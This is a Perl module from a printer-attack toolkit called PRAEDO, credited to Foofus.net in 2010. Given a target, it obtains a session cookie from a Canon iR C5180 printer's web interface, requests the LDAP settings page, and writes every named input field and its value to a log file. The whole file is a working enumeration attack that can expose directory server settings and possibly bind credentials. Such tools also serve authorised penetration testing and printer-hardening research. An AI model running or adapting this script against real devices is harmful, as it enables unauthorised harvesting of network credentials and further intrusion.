# Canon printer iR C5180 Module for enumerating 
# LDAP Settings.
######################################################
#                  PRAEDO Module #MP00049            #
#          Copyright (C) 2010 Foofus.net	     #
#                                                    #
#               Deral "percX" Heiland                #
######################################################
package MP0009;
sub MP0009
{
 
# Set global variables
my $count = 0;
my $num = 0;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];

#------ Setup and retrieve cookie and place in cookie jar
my $browser = LWP::UserAgent->new(timeout => 15);
my $jar = HTTP::Cookies->new();
$browser->cookie_jar($jar);
my $req= new HTTP::Request GET =>"http://$TARGET:$PORTS/";
my $res = $browser->request($req);
$jar->extract_cookies($res);

#------ Enumerate LDAP setting from Cannon Printer
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "\n**********Attempting to enumerate LDAP configuration of Cannon printer $TARGET : Job MP0009**********\n";
print OUTFILE "\n**********Attempting to enumerate LDAP configuration of Cannon printer $TARGET : Job MP0009**********\n";

# retrieve LDAP Settings form page from cannon printer
my $url1="http://$TARGET:$PORTS/cldap.cgi?Flag=Init_Data&PageFlag=c_l_set1.tpl&Dummy=";
my $request = new HTTP::Request('GET', $url1);
my $response = $browser->request($request);
my $content = $response->content();

# parse LDAP settings from page information on input tags
my $html = HTML::TagParser->new($content);

my @list = $html->getElementsByTagName( "input" );
    foreach my $elem ( @list ) 
   {
        my $text1 = $elem->getAttribute("name");
        my $text2 = $elem->getAttribute("value");
            
          if (( $text2 eq "" ) && ($num eq $count)) 
               {
               }
	  else 
               {
                  if ($num eq $count)
                     {
                       # print "$text1 value = $text2\n";
		       print OUTFILE "$text1 value = $text2\n";
                       $num = $num+1;
                     }
                  else 
                    {
                    }
             } 
	$count = $count+1;
    }
    




# operation completed close out output files
close(OUTFILE);
}
		
1;
